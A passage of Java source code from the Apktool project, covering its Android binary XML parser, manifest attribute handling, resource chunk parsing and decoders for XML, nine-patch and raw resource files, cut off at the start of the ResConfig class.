            mNamespaces.decrementDepth();
        }

        while (nextChunk()) {
            switch (mParser.chunkType()) {
                case ResChunkHeader.RES_STRING_POOL_TYPE:
                    mStringPool = ResStringPool.parse(mParser);
                    continue;
                case ResChunkHeader.RES_XML_RESOURCE_MAP_TYPE:
                    skipUnreadHeader();

                    mResourceMap = new ResId[mParser.dataSize() / 4];
                    for (int i = 0; i < mResourceMap.length; i++) {
                        mResourceMap[i] = ResId.of(mIn.readInt());
                    }
                    continue;
            }

            if (mParser.chunkType() < ResChunkHeader.RES_XML_FIRST_CHUNK_TYPE
                    || mParser.chunkType() > ResChunkHeader.RES_XML_LAST_CHUNK_TYPE) {
                skipUnexpectedChunk();
                continue;
            }

            // ResXMLTree_node
            mLineNumber = mIn.readInt();
            mIn.skipInt(); // comment

            switch (mParser.chunkType()) {
                case ResChunkHeader.RES_XML_START_NAMESPACE_TYPE: {
                    // ResXMLTree_namespaceExt
                    int prefix = mIn.readInt();
                    int uri = mIn.readInt();

                    skipUnreadHeader();

                    mNamespaces.push(prefix, uri);
                    continue;
                }
                case ResChunkHeader.RES_XML_END_NAMESPACE_TYPE:
                    // ResXMLTree_namespaceExt
                    mIn.skipInt(); // prefix
                    mIn.skipInt(); // uri

                    skipUnreadHeader();

                    mNamespaces.pop();
                    continue;
                case ResChunkHeader.RES_XML_START_ELEMENT_TYPE: {
                    long startPosition = mIn.position();
                    // ResXMLTree_attrExt
                    mNamespaceIndex = mIn.readInt();
                    mNameIndex = mIn.readInt();
                    int attributeStart = mIn.readUnsignedShort();
                    int attributeSize = mIn.readUnsignedShort();
                    int attributeCount = mIn.readUnsignedShort();
                    mIdIndex = mIn.readUnsignedShort();
                    mClassIndex = mIn.readUnsignedShort();
                    mStyleIndex = mIn.readUnsignedShort();

                    skipUnreadHeader();

                    // Align the stream with the start of the attributes.
                    mIn.jumpTo(startPosition + attributeStart);

                    mAttributes = new Attribute[attributeCount];
                    for (int i = 0; i < attributeCount; i++) {
                        Attribute attr = Attribute.read(mIn);

                        if (attributeSize > Attribute.SIZE) {
                            int skipped = mIn.skipBytes(attributeSize - Attribute.SIZE);
                            Log.d(TAG, "Skipped unknown %s bytes in attribute.", skipped);
                        }

                        // Check if the app preserved raw attribute values.
                        if (attr.valueType == ResValue.TYPE_STRING
                                ? attr.valueData != attr.rawValue : attr.rawValue >= 0) {
                            mHasRawValues = true;
                        }

                        mAttributes[i] = attr;
                    }

                    mNamespaces.incrementDepth();
                    return mEventType = START_TAG;
                }
                case ResChunkHeader.RES_XML_END_ELEMENT_TYPE:
                    // ResXMLTree_endElementExt
                    mNamespaceIndex = mIn.readInt();
                    mNameIndex = mIn.readInt();

                    skipUnreadHeader();
                    return mEventType = END_TAG;
                case ResChunkHeader.RES_XML_CDATA_TYPE:
                    // ResXMLTree_cdataExt
                    mNameIndex = mIn.readInt();
                    mIn.skipInt(); // size, res0, type
                    mIn.skipInt(); // data

                    skipUnreadHeader();
                    return mEventType = TEXT;
                default:
                    skipUnexpectedChunk();
                    continue;
            }
        }

        Log.d(TAG, "End of chunks at 0x%08x", mIn.position());

        if (mIn.available() > 0) {
            Log.d(TAG, "Ignoring trailing data at 0x%08x.", mIn.position());
        }

        return mEventType = END_DOCUMENT;
    }

    private void skipUnexpectedChunk() throws IOException {
        Log.w(TAG, "Skipping unexpected %s chunk of %s bytes at 0x%08x.",
            mParser.chunkName(), mParser.chunkSize(), mParser.chunkStart());
        mParser.skipChunk();
    }

    private void skipUnreadHeader() throws IOException {
        // Some apps lie about the reported size of their chunk header. Trusting the header size is misleading,
        // so compare to what we actually read in the header vs reported and skip the rest.
        int bytesRead = (int) (mIn.position() - mParser.chunkStart());
        readExceedingBytes("Chunk header", mParser.headerSize(), bytesRead);
    }

    private byte[] readExceedingBytes(String name, int size, int bytesRead) throws IOException {
        int bytesExceeding = size - bytesRead;
        if (bytesExceeding > 0) {
            byte[] buf = mIn.readBytes(bytesExceeding);
            for (int i = 0; i < buf.length; i++) {
                if (buf[i] != 0) {
                    Log.w(TAG, "%s size: %s bytes, read: %s bytes. Exceeding bytes: %s",
                        name, size, bytesRead, BaseEncoding.base16().encode(buf));
                    return buf;
                }
            }
        }
        return null;
    }

    private static final class NamespaceStack {
        private static final int INITIAL_CAPACITY = 32;

        private int[] mData;
        private int mDataLength;
        private int mDepth;

        public NamespaceStack() {
            mData = new int[INITIAL_CAPACITY];
            reset();
        }

        public void reset() {
            mDataLength = 0;
            mDepth = -1;
            incrementDepth();
        }

        public int getDepth() {
            return mDepth;
        }

        public void incrementDepth() {
            ensureCapacity();
            int offset = mDataLength;
            mData[offset] = 0;
            mData[offset + 1] = 0;
            mDataLength += 2;
            mDepth++;
        }

        private void ensureCapacity() {
            if (mData.length - mDataLength >= 2) {
                return;
            }
            int[] newData = new int[mData.length + INITIAL_CAPACITY];
            System.arraycopy(mData, 0, newData, 0, mDataLength);
            mData = newData;
        }

        public void decrementDepth() {
            if (mDataLength == 0) {
                return;
            }
            int offset = mDataLength - 1;
            int count = mData[offset];
            mDataLength -= (2 + count * 2);
            mDepth--;
        }

        public int getCount(int depth) {
            if (mDataLength == 0 || depth <= 0) {
                return 0;
            }
            if (depth > mDepth) {
                depth = mDepth;
            }
            int total = 0;
            int offset = 0;
            for (; depth > 0; --depth) {
                int count = mData[offset];
                total += count;
                offset += (2 + count * 2);
            }
            return total;
        }

        public int getCurrentCount() {
            if (mDataLength == 0) {
                return 0;
            }
            int offset = mDataLength - 1;
            return mData[offset];
        }

        public void push(int prefix, int uri) {
            ensureCapacity();
            int offset = mDataLength - 1;
            int count = mData[offset];
            mData[offset - 1 - count * 2] = count + 1;
            mData[offset] = prefix;
            mData[offset + 1] = uri;
            mData[offset + 2] = count + 1;
            mDataLength += 2;
        }

        public boolean pop() {
            if (mDataLength == 0) {
                return false;
            }
            int offset = mDataLength - 1;
            int count = mData[offset];
            if (count == 0) {
                return false;
            }
            count--;
            offset -= 2;
            mData[offset] = count;
            offset -= (1 + count * 2);
            mData[offset] = count;
            mDataLength -= 2;
            return true;
        }

        public int getPrefix(int index) {
            return get(index, true);
        }

        public int getUri(int index) {
            return get(index, false);
        }

        private int get(int index, boolean isPrefix) {
            if (mDataLength == 0 || index < 0) {
                return -1;
            }
            int offset = 0;
            for (int i = mDepth; i >= 0; i--) {
                int count = mData[offset];
                if (index >= count) {
                    index -= count;
                    offset += (2 + count * 2);
                    continue;
                }
                offset += (1 + index * 2);
                if (!isPrefix) {
                    offset++;
                }
                return mData[offset];
            }
            return -1;
        }

        public int findPrefix(int uri) {
            return find(uri, true);
        }

        public int findUri(int prefix) {
            return find(prefix, false);
        }

        private int find(int prefixOrUri, boolean isPrefix) {
            if (mDataLength == 0) {
                return -1;
            }
            int offset = mDataLength - 1;
            for (int i = mDepth; i >= 0; i--) {
                int count = mData[offset];
                offset -= 2;
                for (; count > 0; --count) {
                    if (isPrefix) {
                        if (mData[offset + 1] == prefixOrUri) {
                            return mData[offset];
                        }
                    } else {
                        if (mData[offset] == prefixOrUri) {
                            return mData[offset + 1];
                        }
                    }
                    offset -= 2;
                }
            }
            return -1;
        }
    }

    private static final class Attribute {
        public static final int SIZE = 20;

        public final int ns;
        public final int name;
        public final int rawValue;
        public final int valueType;
        public final int valueData;

        public Attribute(int ns, int name, int rawValue, int valueType, int valueData) {
            this.ns = ns;
            this.name = name;
            this.rawValue = rawValue;
            this.valueType = valueType;
            this.valueData = valueData;
        }

        public static Attribute read(BinaryDataInputStream in) throws IOException {
            // ResXMLTree_attribute
            int ns = in.readInt();
            int name = in.readInt();
            int rawValue = in.readInt();
            // Res_value
            int valueSize = in.readUnsignedShort();
            if (valueSize < 8) {
                return null;
            }
            in.skipByte(); // res0
            int valueType = in.readUnsignedByte();
            int valueData = in.readInt();

            return new Attribute(ns, name, rawValue, valueType, valueData);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ManifestPullEventHandler.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.meta.ApkInfo;
import brut.androlib.meta.ResourcesInfo;
import brut.androlib.meta.SdkInfo;
import brut.androlib.meta.VersionInfo;
import brut.androlib.res.xml.ResXmlUtils;
import brut.xmlpull.XmlPullUtils;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;
import org.xmlpull.v1.XmlSerializer;

public class ManifestPullEventHandler implements XmlPullUtils.EventHandler {
    private final ApkInfo mApkInfo;
    private final boolean mHideSdkInfo;

    public ManifestPullEventHandler(ApkInfo apkInfo, boolean hideSdkInfo) {
        mApkInfo = apkInfo;
        mHideSdkInfo = hideSdkInfo;
    }

    @Override
    public boolean onEvent(XmlPullParser in, XmlSerializer out) throws XmlPullParserException {
        int type = in.getEventType();

        if (type == XmlPullParser.START_TAG) {
            String name = in.getName();

            if (name.equals("manifest")) {
                parseManifest(in);
            } else if (name.equals("uses-sdk")) {
                parseUsesSdk(in);

                if (mHideSdkInfo) {
                    return true;
                }
            }
        } else if (type == XmlPullParser.END_TAG) {
            String name = in.getName();

            if (name.equals("uses-sdk")) {
                if (mHideSdkInfo) {
                    return true;
                }
            }
        }

        return false;
    }

    private void parseManifest(XmlPullParser in) {
        ResourcesInfo resourcesInfo = mApkInfo.getResourcesInfo();
        VersionInfo versionInfo = mApkInfo.getVersionInfo();

        for (int i = 0; i < in.getAttributeCount(); i++) {
            String ns = in.getAttributeNamespace(i);
            String name = in.getAttributeName(i);
            String value = in.getAttributeValue(i);

            if (value.isEmpty()) {
                continue;
            }
            if (ns.isEmpty()) {
                if (name.equals("package")) {
                    // This is temporary and will be compared to actual resources package later.
                    resourcesInfo.setPackageName(value);
                }
            } else if (ns.equals(ResXmlUtils.ANDROID_RES_NS)) {
                switch (name) {
                    case "versionCode":
                        versionInfo.setVersionCode(Integer.parseInt(value));
                        break;
                    case "versionName":
                        versionInfo.setVersionName(value);
                        break;
                }
            }
        }
    }

    private void parseUsesSdk(XmlPullParser in) {
        SdkInfo sdkInfo = mApkInfo.getSdkInfo();

        for (int i = 0; i < in.getAttributeCount(); i++) {
            String ns = in.getAttributeNamespace(i);
            String name = in.getAttributeName(i);
            String value = in.getAttributeValue(i);

            if (value.isEmpty()) {
                continue;
            }
            if (ns.equals(ResXmlUtils.ANDROID_RES_NS)) {
                switch (name) {
                    case "minSdkVersion":
                        sdkInfo.setMinSdkVersion(value);
                        break;
                    case "targetSdkVersion":
                        sdkInfo.setTargetSdkVersion(value);
                        break;
                    case "maxSdkVersion":
                        sdkInfo.setMaxSdkVersion(value);
                        break;
                }
            }
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ResChunkPullParser.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.res.data.ResChunkHeader;
import brut.util.BinaryDataInputStream;

import java.io.EOFException;
import java.io.IOException;
import java.nio.ByteOrder;

public class ResChunkPullParser {
    private static final long OFFSET_ENDED = -1;

    private final BinaryDataInputStream mIn;
    private final long mOffset;
    private final int mSize;
    private long mChunkOffset;
    private ResChunkHeader mChunkHeader;

    public ResChunkPullParser(BinaryDataInputStream in) {
        this(in, Integer.MAX_VALUE);
    }

    public ResChunkPullParser(BinaryDataInputStream in, int size) {
        assert in.order() == ByteOrder.LITTLE_ENDIAN;
        mIn = in;
        mOffset = in.position();
        mSize = size;
    }

    public BinaryDataInputStream stream() {
        return mIn;
    }

    public boolean isChunk() {
        return mChunkHeader != null;
    }

    public long chunkStart() {
        if (mChunkHeader == null) {
            throw new IllegalStateException();
        }
        return mChunkOffset;
    }

    public int chunkType() {
        if (mChunkHeader == null) {
            throw new IllegalStateException();
        }
        return mChunkHeader.type;
    }

    public String chunkName() {
        if (mChunkHeader == null) {
            throw new IllegalStateException();
        }
        return ResChunkHeader.nameOf(mChunkHeader.type);
    }

    public int chunkSize() {
        if (mChunkHeader == null) {
            throw new IllegalStateException();
        }
        return mChunkHeader.size;
    }

    public long chunkEnd() {
        if (mChunkHeader == null) {
            throw new IllegalStateException();
        }
        return mChunkOffset + mChunkHeader.size;
    }

    public int headerSize() {
        if (mChunkHeader == null) {
            throw new IllegalStateException();
        }
        return mChunkHeader.headerSize;
    }

    public long headerEnd() {
        if (mChunkHeader == null) {
            throw new IllegalStateException();
        }
        return mChunkOffset + mChunkHeader.headerSize;
    }

    public int dataSize() {
        if (mChunkHeader == null) {
            throw new IllegalStateException();
        }
        return mChunkHeader.size - mChunkHeader.headerSize;
    }

    public boolean next() throws IOException {
        if (mChunkOffset == OFFSET_ENDED) {
            return false;
        }

        // Jump to the next chunk.
        if (mChunkHeader != null) {
            skipChunk();
            mChunkHeader = null;
        }

        if (mIn.position() >= mOffset + mSize) {
            // End of chunks due to size limit.
            mChunkOffset = OFFSET_ENDED;
            return false;
        }

        // Read the chunk header at the current position.
        try {
            mChunkOffset = mIn.position();
            ResChunkHeader chunkHeader = ResChunkHeader.read(mIn);

            if (chunkHeader.headerSize < ResChunkHeader.SIZE
                    || chunkHeader.size < chunkHeader.headerSize) {
                throw new IOException(
                    String.format("Invalid chunk header: type=0x%04x, headerSize=%s, size=%s",
                        chunkHeader.type, chunkHeader.headerSize, chunkHeader.size));
            }

            mChunkHeader = chunkHeader;
            return true;
        } catch (EOFException ignored) {
            // End of chunks due to end of stream.
            mChunkOffset = OFFSET_ENDED;
            return false;
        } catch (IOException ex) {
            throw new IOException("Error while reading chunk header.", ex);
        }
    }

    public int skipChunk() throws IOException {
        if (mChunkHeader == null) {
            throw new IllegalStateException();
        }
        try {
            long position = mIn.position();
            long chunkEnd = chunkEnd();
            if (position == chunkEnd) {
                return 0;
            }
            if (position > chunkEnd) {
                throw new IOException("Stream advanced past chunk end.");
            }
            return mIn.skipBytes((int) (chunkEnd - position));
        } catch (EOFException ignored) {
            throw new EOFException("Unexpected EOF while skipping chunk.");
        } catch (IOException ex) {
            throw new IOException("Error while skipping chunk.", ex);
        }
    }

    public int skipHeader() throws IOException {
        if (mChunkHeader == null) {
            throw new IllegalStateException();
        }
        try {
            long position = mIn.position();
            long headerEnd = headerEnd();
            if (position == headerEnd) {
                return 0;
            }
            if (position > headerEnd) {
                throw new IOException("Stream advanced past chunk header end.");
            }
            return mIn.skipBytes((int) (headerEnd - position));
        } catch (EOFException ignored) {
            throw new EOFException("Unexpected EOF while skipping chunk header.");
        } catch (IOException ex) {
            throw new IOException("Error while skipping chunk header.", ex);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ResFileDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.exceptions.NinePatchNotFoundException;
import brut.androlib.exceptions.RawXmlEncounteredException;
import brut.androlib.res.table.ResEntry;
import brut.androlib.res.table.value.ResFileReference;
import brut.androlib.res.table.value.ResPrimitive;
import brut.androlib.res.table.value.ResString;
import brut.common.Log;
import brut.directory.Directory;
import brut.directory.DirectoryException;
import org.apache.commons.io.FilenameUtils;

import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Map;

public class ResFileDecoder {
    private static final String TAG = ResFileDecoder.class.getName();

    public enum Type { UNKNOWN, BINARY_XML, PNG_9PATCH }

    private final Map<Type, ResStreamDecoder> mDecoders;

    public ResFileDecoder(Map<Type, ResStreamDecoder> decoders) {
        mDecoders = decoders;
    }

    public void decode(ResEntry entry, Directory inDir, Directory outDir, Map<String, String> resFileMap) {
        String inFileName = ((ResFileReference) entry.getValue()).getPath();

        // Some apps have string values where they shouldn't be.
        // We assumed that they are file references, but if no such file then fall back to a string value.
        if (!inDir.containsFile(inFileName)) {
            entry.setValue(new ResString(inFileName));
            return;
        }

        // Get input file extension.
        String ext = inFileName.endsWith(".9.png") ? "9.png" : FilenameUtils.getExtension(inFileName).toLowerCase();

        // Use aapt2-like logic to determine which decoder to use.
        // TODO: Determine by magic bytes and fill in stripped extensions?
        Type type = Type.UNKNOWN;
        if (!ext.isEmpty() && !entry.getType().getName().equals("raw")) {
            switch (ext) {
                case "xml":
                case "xsd":
                    type = Type.BINARY_XML;
                    break;
                case "9.png":
                    type = Type.PNG_9PATCH;
                    break;
            }
        }

        // Generate output file name from entry.
        String outFileName = "res/" + entry.getType().getName() + entry.getType().getConfig().toQualifiers()
                           + "/" + entry.getName() + (ext.isEmpty() ? "" : "." + ext);

        // Map input file name to output file name.
        resFileMap.put(inFileName, outFileName);

        Log.d(TAG, "Decoding file " + inFileName + " to " + outFileName);

        try {
            if (type != Type.UNKNOWN) {
                try {
                    decode(type, inDir, inFileName, outDir, outFileName);
                    return;
                } catch (RawXmlEncounteredException ignored) {
                    // Assume the file is a raw XML.
                    Log.d(TAG, "Could not decode binary XML file: " + inFileName);
                } catch (NinePatchNotFoundException ignored) {
                    // Assume the file is a raw PNG.
                    // Some apps contain unprocessed dummy 3x3 9-patch PNGs.
                    // Extract them as-is, let aapt2 process them properly later.
                    Log.d(TAG, "Could not find 9-patch chunk in file: " + inFileName);
                }
            }

            decode(Type.UNKNOWN, inDir, inFileName, outDir, outFileName);
        } catch (AndrolibException ignored) {
            Log.w(TAG, "Could not decode file, replacing by NULL value: " + inFileName);
            entry.setValue(ResPrimitive.NULL);
        }
    }

    private void decode(Type type, Directory inDir, String inFileName, Directory outDir, String outFileName)
            throws AndrolibException {
        ResStreamDecoder decoder = mDecoders.get(type);
        if (decoder == null) {
            throw new AndrolibException("Undefined decoder for type: " + type);
        }

        boolean success = false;
        try (
            InputStream in = inDir.getFileInput(inFileName);
            OutputStream out = outDir.getFileOutput(outFileName)
        ) {
            decoder.decode(in, out);
            success = true;
        } catch (DirectoryException | IOException ex) {
            throw new AndrolibException(ex);
        } finally {
            if (!success) {
                outDir.removeFile(outFileName);
            }
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ResNinePatchStreamDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.exceptions.NinePatchNotFoundException;
import brut.androlib.res.data.LayoutBounds;
import brut.androlib.res.data.NinePatchData;
import brut.util.BinaryDataInputStream;
import org.apache.commons.io.IOUtils;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.awt.image.Raster;
import java.awt.image.WritableRaster;
import java.io.ByteArrayInputStream;
import java.io.EOFException;
import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.ByteOrder;

public class ResNinePatchStreamDecoder implements ResStreamDecoder {

    @Override
    public void decode(InputStream in, OutputStream out) throws AndrolibException {
        try {
            byte[] data = IOUtils.toByteArray(in);
            if (data.length == 0) {
                return;
            }

            BufferedImage src = ImageIO.read(new ByteArrayInputStream(data));
            int w = src.getWidth(), h = src.getHeight();

            BufferedImage dst = new BufferedImage(w + 2, h + 2, BufferedImage.TYPE_INT_ARGB);
            if (src.getType() == BufferedImage.TYPE_CUSTOM) {
                Raster srcRaster = src.getRaster();
                WritableRaster dstRaster = dst.getRaster();
                int[] gray = null, alpha = null;
                for (int y = 0; y < src.getHeight(); y++) {
                    gray = srcRaster.getSamples(0, y, w, 1, 0, gray);
                    alpha = srcRaster.getSamples(0, y, w, 1, 1, alpha);

                    dstRaster.setSamples(1, y + 1, w, 1, 0, gray);
                    dstRaster.setSamples(1, y + 1, w, 1, 1, gray);
                    dstRaster.setSamples(1, y + 1, w, 1, 2, gray);
                    dstRaster.setSamples(1, y + 1, w, 1, 3, alpha);
                }
            } else {
                dst.createGraphics().drawImage(src, 1, 1, w, h, null);
            }

            NinePatchData np = findNinePatchData(data);
            drawHLine(dst, h + 1, np.paddingLeft + 1, w - np.paddingRight);
            drawVLine(dst, w + 1, np.paddingTop + 1, h - np.paddingBottom);

            int[] xDivs = np.xDivs;
            if (xDivs.length == 0) {
                drawHLine(dst, 0, 1, w);
            } else {
                for (int i = 0; i < xDivs.length; i += 2) {
                    drawHLine(dst, 0, xDivs[i] + 1, xDivs[i + 1]);
                }
            }

            int[] yDivs = np.yDivs;
            if (yDivs.length == 0) {
                drawVLine(dst, 0, 1, h);
            } else {
                for (int i = 0; i < yDivs.length; i += 2) {
                    drawVLine(dst, 0, yDivs[i] + 1, yDivs[i + 1]);
                }
            }

            // Some images optionally use optical inset/layout bounds.
            // https://developer.android.com/about/versions/android-4.3.html#OpticalBounds
            try {
                LayoutBounds lb = findLayoutBounds(data);
                for (int i = 0; i < lb.left; i++) {
                    int x = 1 + i;
                    dst.setRGB(x, h + 1, LayoutBounds.COLOR_TICK);
                }
                for (int i = 0; i < lb.right; i++) {
                    int x = w - i;
                    dst.setRGB(x, h + 1, LayoutBounds.COLOR_TICK);
                }
                for (int i = 0; i < lb.top; i++) {
                    int y = 1 + i;
                    dst.setRGB(w + 1, y, LayoutBounds.COLOR_TICK);
                }
                for (int i = 0; i < lb.bottom; i++) {
                    int y = h - i;
                    dst.setRGB(w + 1, y, LayoutBounds.COLOR_TICK);
                }
            } catch (NinePatchNotFoundException ignored) {
                // This chunk might not exist.
            }

            ImageIO.write(dst, "png", out);
        } catch (IOException | NullPointerException ex) {
            // The file is not a valid image.
            throw new AndrolibException(ex);
        }
    }

    private NinePatchData findNinePatchData(byte[] data) throws NinePatchNotFoundException, IOException {
        BinaryDataInputStream in = new BinaryDataInputStream(data, ByteOrder.BIG_ENDIAN);
        findChunk(in, NinePatchData.MAGIC);
        return NinePatchData.read(in);
    }

    private LayoutBounds findLayoutBounds(byte[] data) throws NinePatchNotFoundException, IOException {
        BinaryDataInputStream in = new BinaryDataInputStream(data, ByteOrder.BIG_ENDIAN);
        findChunk(in, LayoutBounds.MAGIC);
        return LayoutBounds.read(in);
    }

    private void findChunk(BinaryDataInputStream in, int magic) throws NinePatchNotFoundException, IOException {
        in.skipBytes(8);
        for (;;) {
            int size;
            try {
                size = in.readInt();
            } catch (EOFException ignored) {
                throw new NinePatchNotFoundException();
            }
            if (in.readInt() == magic) {
                return;
            }
            in.skipBytes(size + 4);
        }
    }

    private void drawHLine(BufferedImage im, int y, int x1, int x2) {
        for (int x = x1; x <= x2; x++) {
            im.setRGB(x, y, NinePatchData.COLOR_TICK);
        }
    }

    private void drawVLine(BufferedImage im, int x, int y1, int y2) {
        for (int y = y1; y <= y2; y++) {
            im.setRGB(x, y, NinePatchData.COLOR_TICK);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ResRawStreamDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.exceptions.AndrolibException;
import org.apache.commons.io.IOUtils;

import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;

public class ResRawStreamDecoder implements ResStreamDecoder {

    @Override
    public void decode(InputStream in, OutputStream out) throws AndrolibException {
        try {
            IOUtils.copy(in, out);
        } catch (IOException ex) {
            throw new AndrolibException("Could not decode raw stream.", ex);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ResStreamDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.exceptions.AndrolibException;

import java.io.InputStream;
import java.io.OutputStream;

public interface ResStreamDecoder {
    void decode(InputStream in, OutputStream out) throws AndrolibException;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ResXmlPullStreamDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.exceptions.RawXmlEncounteredException;
import brut.androlib.res.xml.ResXmlSerializer;
import brut.xmlpull.XmlPullUtils;
import org.xmlpull.v1.XmlPullParserException;

import java.io.InputStream;
import java.io.IOException;
import java.io.OutputStream;

public class ResXmlPullStreamDecoder implements ResStreamDecoder {
    private final BinaryXmlResourceParser mParser;
    private final ResXmlSerializer mSerial;
    private final XmlPullUtils.EventHandler mHandler;

    public ResXmlPullStreamDecoder(BinaryXmlResourceParser parser, ResXmlSerializer serial) {
        this(parser, serial, null);
    }

    public ResXmlPullStreamDecoder(BinaryXmlResourceParser parser, ResXmlSerializer serial,
                                   XmlPullUtils.EventHandler handler) {
        mParser = parser;
        mSerial = serial;
        mHandler = handler;
    }

    @Override
    public void decode(InputStream in, OutputStream out) throws AndrolibException {
        try {
            mParser.setInput(in, null);
            mSerial.setOutput(out, null);
            XmlPullUtils.copy(mParser, mSerial, mHandler);
        } catch (XmlPullParserException ex) {
            throw new RawXmlEncounteredException(ex);
        } catch (IOException ex) {
            throw new AndrolibException(ex);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/ResConfig.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table;

import java.util.Arrays;
import java.util.Locale;

public class ResConfig {
    public static final int SDK_BASE = 1;
    public static final int SDK_BASE_1_1 = 2;
    public static final int SDK_CUPCAKE = 3;
    public static final int SDK_DONUT = 4;
    public static final int SDK_ECLAIR = 5;
    public static final int SDK_ECLAIR_0_1 = 6;
    public static final int SDK_ECLAIR_MR1 = 7;
    public static final int SDK_FROYO = 8;
